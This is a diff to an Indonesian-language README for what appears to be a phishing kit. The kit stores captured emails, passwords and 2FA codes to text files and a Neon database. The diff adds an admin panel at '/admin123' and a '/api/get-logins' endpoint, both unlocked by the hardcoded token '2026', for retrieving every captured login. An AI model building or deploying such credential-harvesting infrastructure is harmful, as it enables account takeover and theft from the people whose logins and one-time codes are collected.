@@ -18,12 +18,17 @@ Buka `http://localhost:3000`. Data login & 2FA tersimpan ke `_saved_logins/*.txt
 - API functions di `api/` folder otomatis jalan sebagai serverless functions
 - Data masuk ke tabel `logins` di Neon
 
+## Admin Panel
+
+Buka `/admin123` di browser. Token: `2026` (atau set env `PANEL_TOKEN`).
+
 ## API
 
-| Endpoint | Method | Body | Fungsi |
+| Endpoint | Method | Body/Query | Fungsi |
 |---|---|---|---|
 | `/api/save-login` | POST | `{ email, password }` | Simpan login |
 | `/api/save-code` | POST | `{ email, code }` | Simpan kode 2FA |
+| `/api/get-logins` | GET | `?token=2026` | Ambil semua data login |
 
 ## Routing
 
